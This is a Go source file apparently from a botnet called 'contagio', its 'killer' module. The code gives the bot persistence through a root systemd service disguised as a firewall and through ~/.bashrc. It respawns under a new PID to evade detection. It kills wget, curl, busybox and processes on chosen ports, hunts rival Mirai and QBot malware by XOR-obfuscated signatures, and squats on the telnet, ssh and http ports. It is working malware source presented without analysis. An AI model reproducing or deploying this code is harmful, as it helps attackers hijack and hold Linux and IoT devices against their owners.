package main

import (
	"bytes"
	"contagio/bot/config"
	"contagio/bot/methods"
	"contagio/bot/utils"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unicode"
)

var (
	UPX_WEBSITE = []byte{120, 100, 100, 96, 42, 63, 63, 101, 96, 104, 62, 99, 118, 62, 126, 117, 100}
	UPX_SECTION = []byte{69, 64, 72, 14}

	MIRAI_ATTACK = []byte{113, 100, 100, 113, 115, 123}
	MIRAI_KILLER = []byte{123, 121, 124, 124, 117, 98}

	QBOT_CNC       = []byte{99, 117, 126, 116, 83, 94, 83}
	QBOT_GETRANDIP = []byte{119, 117, 100, 66, 113, 126, 116, 127, 125, 64, 101, 114, 124, 121, 115, 89, 64}
	QBOT_COMMSERV  = []byte{115, 127, 125, 125, 67, 117, 98, 102, 117, 98}
)

func updatePid(pid uintptr) {
	defer methods.Catch()

	fname := utils.RandomString(15)

	err := os.WriteFile(fname, config.BINARY_FILE, os.ModePerm)
	if err != nil {
		if config.DEBUG {
			fmt.Println("[killer] Pid changer error: ", err.Error())
		}
		return
	}

	cmd := exec.Command("./" + fname)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin
	go cmd.Run()

	time.Sleep(1 * time.Second)

	os.Exit(0)
}

func systemdInfect() error {

	defer methods.Catch()

	binary, err := exec.LookPath("systemctl")
	if err != nil {
		if config.DEBUG {
			fmt.Println("[killer] Systemd error: ", err.Error())
		}
		return err
	}

	args := []string{"systemctl", "--version"}

	env := os.Environ()

	_, _, err = syscall.StartProcess(binary, args, &syscall.ProcAttr{Env: env})
	if err != nil {
		if config.DEBUG {
			fmt.Println(err)
		}
		return err
	}

	if _, err := os.Stat("/etc/systemd/system/"); os.IsNotExist(err) {
		return err
	}

	service := `[Unit]
Description=Firewall
After=default.target

[Service]
User=root
Restart=on-failure
ExecStart=` + os.Args[0] + `

[Install]
WantedBy=default.target`

	err = os.WriteFile("/etc/systemd/system/fireball.service", []byte(service), os.ModePerm)
	if err != nil {
		if config.DEBUG {
			fmt.Println("[killer] Systemd error: ", err.Error())
		}
		return err
	}

	cmd := exec.Command("sudo", "systemctl", "enable", "fireball.service")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin
	err = cmd.Run()
	if err != nil {
		if config.DEBUG {
			fmt.Println("[killer] Systemd error: ", err.Error())
		}
		return err
	}

	return nil
}

func bashrcInfect() {
	defer methods.Catch()

	PWD, err := os.Getwd()
	if err != nil {
		if config.DEBUG {
			fmt.Println("[killer] Bashrc error: " + err.Error())
		}
	}

	HOME, err := os.UserHomeDir()
	if err != nil {
		if config.DEBUG {
			fmt.Println("[killer] Bashrc error: " + err.Error())
		}

		return
	}
	file, err := os.OpenFile(HOME+"/.bashrc", os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0664)
	if err != nil {
		if config.DEBUG {
			fmt.Println("[killer] Bashrc error: " + err.Error())
		}
		return
	}
	defer file.Close()

	spl := strings.Split(os.Args[0], "/")

	err = os.WriteFile("fireball.sh", []byte(PWD+"/"+spl[len(spl)-1]+"\n"), os.ModePerm)
	if err != nil {
		if config.DEBUG {
			fmt.Println("[killer] Bashrc error: " + err.Error())
		}
		return
	}

	_, err = file.WriteString(PWD + "/fireball.sh\n")
	if err != nil {
		if config.DEBUG {
			fmt.Println("[killer] Bashrc error: " + err.Error())
		}
		return
	}

}

func InfectSystem() {
	defer methods.Catch()

	if config.SYSTEMD_INFECTION_ENABLED {
		if syscall.Getuid() == 0 {
			err := systemdInfect()
			if err == nil { // infected
				return
			}
		}

	}
	if config.BASHRC_INFECTION_ENABLED {
		bashrcInfect()
	}

}

func cmdLineKiller() error {
	defer methods.Catch()

	dir, err := os.ReadDir("/proc")
	if err != nil {
		if config.DEBUG {
			fmt.Println("[killer] Killer error: " + err.Error())
		}
		return err
	}

	for _, i := range dir {
		if i.IsDir() && isNumeric(i.Name()) {

			if i.Name() > "9" || i.Name() < "0" {
				continue
			}

			pid, err := strconv.Atoi(i.Name())
			if err != nil {
				if config.DEBUG {
					fmt.Println("[killer] Killer atoi error: " + err.Error())
				}
				continue
			}

			if pid == syscall.Getpid() || pid == syscall.Getppid() {
				continue
			}
			if pid < config.MIN_KILLER_PID || pid > config.MAX_KILLER_PID {
				continue
			}

			fd, err := syscall.Open("/proc/"+i.Name()+"/cmdline", 0, uint32(os.ModePerm))
			if err != nil {
				if config.DEBUG {
					fmt.Println("[killer] Killer open path error: " + err.Error())
				}
				continue
			}

			defer syscall.Close(fd)

			buf := make([]byte, 200)

			n, err := syscall.Read(fd, buf)

			if err != nil {
				if config.DEBUG {
					fmt.Println("[killer] Killer read error: " + err.Error())
				}
				continue
			}

			if strings.Contains(string(buf[:n]), "./") {
				err := syscall.Kill(pid, 9)
				if err != nil {
					if config.DEBUG {
						fmt.Printf("[killer] Can't kill pid (%d) error: %s\n", pid, err.Error())
					}
					continue
				}

				fmt.Printf("[killer] Killed pid ( %d ) with cmdline ( %s )\n", pid, string(buf[:n]))

			}

		}

	}

	return nil
}

func KillerInit() {
	defer methods.Catch()

	DecodeKillerData()

	var wg sync.WaitGroup
	go func() {
		for {

			wg.Add(5)
			go KillByName("wget", &wg)
			go KillByName("curl", &wg)
			go KillByName("tftp", &wg)
			go KillByName("busybox", &wg)
			go KillByName("ftpget", &wg)
			wg.Wait()
			time.Sleep(100 * time.Millisecond)
		}
	}()
	KillByPort(80)
	KillByPort(63643)
	rebindPorts()

	for {
		KillByPort(48101)
		KillByPort(5678)
		KillByPort(1991)
		KillByPort(1338)

		cmdLineKiller()
		mapsKiller()
		scanExe()
		time.Sleep(100 * time.Millisecond)
	}
}

func isNumeric(s string) bool {
	defer methods.Catch()

	for _, r := range s {
		if !unicode.IsDigit(r) {
			return false
		}
	}
	return true
}

func rebindPorts() {
	defer methods.Catch()

	addr := syscall.SockaddrInet4{
		Port: 0,
		Addr: [4]byte{127, 0, 0, 1},
	}

	addr.Port = 23
	if fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0); err == nil {
		defer syscall.Close(fd)

		err := syscall.Bind(fd, &addr)
		if err != nil && config.DEBUG {
			fmt.Println("[killer rebind] Can't bind 23 (telnet) port: " + err.Error())
		}

		err = syscall.Listen(fd, 1)
		if err != nil && config.DEBUG {
			fmt.Println("[killer rebind] Can't listen 23 (telnet) port: " + err.Error())
		}
	}

	addr.Port = 22
	if fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0); err == nil {
		defer syscall.Close(fd)

		err := syscall.Bind(fd, &addr)
		if err != nil && config.DEBUG {
			fmt.Println("[killer rebind] Can't bind 22 (ssh) port: " + err.Error())
		}

		err = syscall.Listen(fd, 1)
		if err != nil && config.DEBUG {
			fmt.Println("[killer rebind] Can't listen 22 (ssh) port: " + err.Error())
		}
	}

	addr.Port = 80
	if fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0); err == nil {
		defer syscall.Close(fd)

		err := syscall.Bind(fd, &addr)
		if err != nil && config.DEBUG {
			fmt.Println("[killer rebind] Can't bind 80 (http) port: " + err.Error())
		}

		err = syscall.Listen(fd, 1)
		if err != nil && config.DEBUG {
			fmt.Println("[killer rebind] Can't listen 80 (http) port: " + err.Error())
		}
	}

}

func KillByPort(targ_port int) {

	defer methods.Catch()

	tcp, _ := os.ReadFile("/proc/net/tcp")

	for x, line := range strings.Split(string(tcp), "\n") {
		if x == 0 {
			continue
		}
		if len(line) < 10 {
			continue
		}
		porthex := strings.Split(line[6:19], ":")[1]
		_port, err := hex.DecodeString(porthex)
		if err != nil {
			fmt.Println(err)
			continue
		}

		_inode := strings.Split(line[90:], " ")[1]
		port := int(_port[1]) + (int(_port[0]) * 256)
		if port == targ_port {
			inode, err := strconv.Atoi(_inode)
			if err != nil {
				if config.DEBUG {
					fmt.Println("[killer] Atoi error: " + err.Error())
				}
				continue
			}
			pid := getPidByInode(int64(inode))
			if pid <= 0 {
				continue
			}

			if pid == syscall.Getpid() || pid == syscall.Getppid() {
				continue
			}

			err = syscall.Kill(pid, 9)
			if err != nil {
				if config.DEBUG {
					fmt.Println("[killer] Kill by port error: " + err.Error())
				}
				continue

			}
			if config.DEBUG {
				fmt.Printf("[killer] Killed pid ( %d ) by port ( %d )\n", pid, port)
			}

			return
		}
	}
}

func mapsKiller() {

	defer methods.Catch()

	dir, err := os.ReadDir("/proc")
	if err != nil {
		if config.DEBUG {
			fmt.Println("[killer] Error: " + err.Error())
		}
		return
	}

	for _, i := range dir {
		if i.IsDir() && isNumeric(i.Name()) {

			if i.Name() > "9" || i.Name() < "0" {
				continue
			}

			pid, err := strconv.Atoi(i.Name())
			if err != nil {
				if config.DEBUG {
					fmt.Println("[killer] Atoi error: " + err.Error())
				}
				continue
			}

			if pid == syscall.Getpid() || pid == syscall.Getppid() {
				continue
			}
			if pid < config.MIN_KILLER_PID || pid > config.MAX_KILLER_PID {
				continue
			}

			fd, err := syscall.Open("/proc/"+i.Name()+"/maps", 0, uint32(os.ModePerm))
			if err != nil {
				continue
			}

			defer syscall.Close(fd)

			buf := make([]byte, 200)

			n, err := syscall.Read(fd, buf)

			if err != nil {
				if config.DEBUG {
					fmt.Println("[killer] Read error: " + err.Error())
				}
				continue
			}

			for _, i := range utils.KillerData {
				if strings.Contains(string(buf[:n]), i) {
					err := syscall.Kill(pid, 9)
					if err != nil {
						if config.DEBUG {
							fmt.Printf("[killer] Can't kill pid (%d) error: %s\n", pid, err.Error())
						}
						continue
					}

					if config.DEBUG {
						fmt.Printf("[killer] Killed pid ( %d ) with killer data ( %s )\n", pid, i)
					}
					// fmt.Println("\n", string(buf[:n]))
				}

			}

		}

	}

}

func getPidByInode(inode int64) int {
	defer methods.Catch()

	d, err := os.Open("/proc")
	if err != nil {
		if config.DEBUG {
			fmt.Println("[killer] getPidByInode error: " + err.Error())
		}
		return 0
	}
	defer d.Close()

	files, err := d.Readdir(-1)
	if err != nil {
		if config.DEBUG {
			fmt.Println("[killer] getPidByInode error: " + err.Error())
		}
		return 0
	}

	for _, file := range files {
		if !file.IsDir() && !isNumeric(file.Name()) {
			continue
		}
		pid, err := strconv.Atoi(file.Name())
		if err != nil {
			continue
		}
		fdDir := fmt.Sprintf("/proc/%d/fd", pid)
		fd, err := os.Open(fdDir)
		if err != nil {
			continue
		}
		defer fd.Close()

		fds, err := fd.Readdir(-1)
		if err != nil {
			continue
		}

		for _, fi := range fds {
			if fi.IsDir() {
				continue
			}
			if fi.Mode()&os.ModeSymlink == os.ModeSymlink {
				link, err := os.Readlink(fmt.Sprintf("%s/%s", fdDir, fi.Name()))
				if err != nil {
					continue
				}
				if strings.Contains(link, fmt.Sprintf("socket:[%d]", inode)) {
					return pid
				}
			}
		}
	}

	return 0
}

func scanExe() {

	defer methods.Catch()

	dir, err := os.ReadDir("/proc/")

	if err != nil {
		if config.DEBUG {
			fmt.Println("[killer] scanExe error: " + err.Error())
		}
		return
	}

	for _, i := range dir {
		if i.IsDir() && isNumeric(i.Name()) {

			if i.Name() > "9" || i.Name() < "0" {
				continue
			}

			var pid, err = strconv.Atoi(i.Name())
			if err != nil {
				if config.DEBUG {
					fmt.Println("[killer] scanExe atoi error: " + err.Error())
				}
				continue
			}

			if pid == syscall.Getpid() || pid == syscall.Getppid() {
				continue
			}

			if pid < config.MIN_KILLER_PID || pid > config.MAX_KILLER_PID {
				continue
			}

			exe, err := os.ReadFile("/proc/" + i.Name() + "/exe")
			if err != nil {
				continue
			}

			// upx
			if bytes.Contains(exe, UPX_WEBSITE) || bytes.Contains(exe, UPX_SECTION) {

				f, err := os.ReadFile("/proc/" + i.Name() + "/cmdline")
				if err != nil {
					continue
				}

				if bytes.Contains(f, []byte{101, 108, 101, 99, 116, 114, 111, 110}) {
					continue
				}

				err = syscall.Kill(pid, 9)
				if err == nil {
					if config.DEBUG {
						fmt.Println("[killer] Killed upx process with pid = " + i.Name())
					}
					continue
				}

			}

			// mirai
			if bytes.Contains(exe, MIRAI_ATTACK) || bytes.Contains(exe, MIRAI_KILLER) {

				f, err := os.ReadFile("/proc/" + i.Name() + "/cmdline")
				if err != nil {
					continue
				}

				if bytes.Contains(f, []byte{101, 108, 101, 99, 116, 114, 111, 110}) {
					continue
				}

				err = syscall.Kill(pid, 9)
				if err == nil {
					if config.DEBUG {
						fmt.Println("[killer] Killed mirai process with pid = " + i.Name())
					}
					continue
				}
			}

			// qbot

			if bytes.Contains(exe, QBOT_CNC) || bytes.Contains(exe, QBOT_COMMSERV) || bytes.Contains(exe, QBOT_GETRANDIP) {

				f, err := os.ReadFile("/proc/" + i.Name() + "/cmdline")
				if err != nil {
					continue
				}

				if bytes.Contains(f, []byte{101, 108, 101, 99, 116, 114, 111, 110}) {
					continue
				}

				err = syscall.Kill(pid, 9)
				if err == nil {
					if config.DEBUG {
						fmt.Println("[killer] Killed qbot process with pid = " + i.Name())
					}
					continue
				}
			}

		}
	}

}

func KillByName(name string, wg *sync.WaitGroup) {

	defer methods.Catch()

	processes, err := os.ReadDir("/proc")
	if err != nil {
		if config.DEBUG {
			fmt.Println("[killer] Can't read /proc")
		}
		return
	}

	for _, i := range processes {
		if !i.IsDir() && !isNumeric(i.Name()) {
			continue
		}

		pid, err := strconv.Atoi(i.Name())
		if err != nil {
			continue
		}

		if pid == syscall.Getpid() || pid == syscall.Getppid() {
			continue
		}

		if pid < config.MIN_KILLER_PID || pid > config.MAX_KILLER_PID {
			continue
		}

		comm, err := os.ReadFile("/proc/" + i.Name() + "/comm")
		if err != nil {
			continue
		}

		if strings.HasPrefix(string(comm), name) {
			err := syscall.Kill(pid, 9)
			if err != nil {
				if config.DEBUG {
					fmt.Printf("[killer] Can't kill %d. Reason: %v\n", pid, err)
				}
				continue
			}
			if config.DEBUG {
				fmt.Printf("[killer] Killed pid ( %d ). Name (%s)\n", pid, name)
			}
		}
	}
	wg.Done()

}

func DecodeKillerData() {
	defer methods.Catch()

	var data map[int][]byte = map[int][]byte{
		1: UPX_WEBSITE,
		2: UPX_SECTION,
		3: MIRAI_ATTACK,
		4: MIRAI_KILLER,
		5: QBOT_CNC,
		6: QBOT_GETRANDIP,
		7: QBOT_COMMSERV,
	}

	for i, bytes := range data {
		var result string
		for _, x := range bytes {
			result += string(x ^ 16)
		}
		switch i {
		case 1:
			UPX_WEBSITE = []byte(result)
		case 2:
			UPX_SECTION = []byte(result)
		case 3:
			MIRAI_ATTACK = []byte(result)
		case 4:
			MIRAI_KILLER = []byte(result)
		case 5:
			QBOT_CNC = []byte(result)
		case 6:
			QBOT_GETRANDIP = []byte(result)
		case 7:
			QBOT_COMMSERV = []byte(result)
		}
	}

}
